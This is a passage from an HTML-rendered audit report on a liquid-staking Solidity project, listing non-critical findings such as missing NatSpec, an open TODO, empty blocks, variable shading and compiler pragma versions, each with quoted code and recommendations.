class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">17</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">18</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">/// @notice signalize burning of LP token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">19</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LPTokenBurnt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blsPublicKeyOfKnot</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">20</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">21</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">/// @notice signalize issuance of new LP token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">22</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NewLPTokenIssued</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blsPublicKeyOfKnot</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">firstDepositor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">23</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">24</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">/// @notice signalize issuance of existing LP token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">25</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LPTokenMinted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blsPublicKeyOfKnot</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong>Description:</strong><br>\nAdd to indexed parameter for countable Events</p>\n<p><strong>Recommendation:</strong><br>\nAdd Event-Emit</p>\n<h2 id=\"n-11-natspec-comments-should-be-increased-in-contracts\" style=\"position:relative;\"><a href=\"#n-11-natspec-comments-should-be-increased-in-contracts\" aria-label=\"n 11 natspec comments should be increased in contracts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-11] NatSpec comments should be increased in contracts</h2>\n<p><strong>Context:</strong><br>\nAll Contracts</p>\n<p><strong>Description:</strong><br>\nIt is recommended that Solidity contracts are fully annotated using NatSpec for all public interfaces (everything in the ABI). It is clearly stated in the Solidity official documentation.<br>\nIn complex projects such as Defi, the interpretation of all functions and their arguments and returns is important for code readability and auditability.<br>\n<a href=\"https://docs.soliditylang.org/en/v0.8.15/natspec-format.html\">https://docs.soliditylang.org/en/v0.8.15/natspec-format.html</a></p>\n<p><strong>Recommendation:</strong><br>\nNatSpec comments should be increased in contracts</p>\n<h2 id=\"n-12-open-todos\" style=\"position:relative;\"><a href=\"#n-12-open-todos\" aria-label=\"n 12 open todos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-12] Open TODOs</h2>\n<p><strong>Context:</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"171\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">result</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">syndicate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Syndicate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">194</span><span class=\"mtk1\">          } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">195</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// todo - check else case for any ETH lost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">196</span><span class=\"mtk1\">          }</span></span></span></code></pre>\n<p><strong>Recommendation:</strong><br>\nUse temporary TODOs as you work on a feature, but make sure to treat them before merging. Either add a link to a proper issue in your TODO, or remove it from the code.</p>\n<h2 id=\"n-13-empty-blocks-should-be-removed-or-emit-something\" style=\"position:relative;\"><a href=\"#n-13-empty-blocks-should-be-removed-or-emit-something\" aria-label=\"n 13 empty blocks should be removed or emit something permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-13] <code>Empty blocks</code> should be <em>removed</em> or <em>Emit</em> something</h2>\n<p><strong>Description:</strong><br>\nCode contains empty block</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"172\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">results</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">files</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GiantPoolBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">101</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_onDepositETH</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">104</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_onWithdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_lpTokens</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LiquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">166</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">629</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">28</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SavETHVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">43</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">43</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SyndicateRewardsProcessor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">98</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OwnableSmartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">25</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">syndicate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Syndicate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">123</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<p><strong>Recommendation:</strong><br>\nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.</p>\n<h2 id=\"n-14-avoid-variable-names-that-can-shade\" style=\"position:relative;\"><a href=\"#n-14-avoid-variable-names-that-can-shade\" aria-label=\"n 14 avoid variable names that can shade permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-14] Avoid variable names that can shade</h2>\n<p>With global variable names in the form of  <code>call{value: value }</code> , argument name similarities can shade and negatively affect code readability.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"173\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OwnableSmartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">77</span><span class=\"mtk1\">:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">78</span><span class=\"mtk12\">:</span><span class=\"mtk1\">         (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">result</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">message</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">target</span><span class=\"mtk1\">.</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{</span><span class=\"mtk12\">value:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">callData</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">79</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">result</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Failed to execute&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">80</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">message</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">81</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h2 id=\"n-15-use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#n-15-use-a-more-recent-version-of-solidity\" aria-label=\"n 15 use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-15] Use a more recent version of Solidity</h2>\n<p><strong>Context:</strong><br>\nAll contracts</p>\n<p><strong>Description:</strong><br>\nFor security, it is best practice to use the latest Solidity version.<br>\nFor the security fix list in the versions;<br>\n<a href=\"https://github.com/ethereum/solidity/blob/develop/Changelog.md\">https://github.com/ethereum/solidity/blob/develop/Changelog.md</a></p>\n<p><strong>Recommendation:</strong><br>\nOld version of Solidity is used <code>(0.8.13)</code>, newer version can be used <code>(0.8.17)</code></p>\n<h2 id=\"n-16-lock-pragmas-to-specific-compiler-version\" style=\"position:relative;\"><a href=\"#n-16-lock-pragmas-to-specific-compiler-version\" aria-label=\"n 16 lock pragmas to specific compiler version permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-16] <em>Lock pragmas</em> to specific compiler version</h2>\n<p><strong>Description:</strong><br>\nPragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or EthPM package. Otherwise, the developer would need to manually update the pragma in order to compile locally.<br>\n<a href=\"https://swcregistry.io/docs/SWC-103\">https://swcregistry.io/docs/SWC-103</a></p>\n<p><strong>Recommendation:</strong><br>\nEthereum Smart Contract Best Practices - Lock pragmas to specific compiler version.<br>\n<a href=\"https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/locking-pragmas/\">solidity-specific/locking-pragmas</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"174\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">files</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IBrandNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ILiquidStakingManagerChildContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ILPTokenInit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ISyndicateFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ISyndicateInit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ITransferHookProcessor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ETHPoolLPFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GiantLP</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GiantMevAndFeesPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GiantPoolBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GiantSavETHVaultPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LiquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPTokenFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LSDNFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OptionalGatekeeperFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span 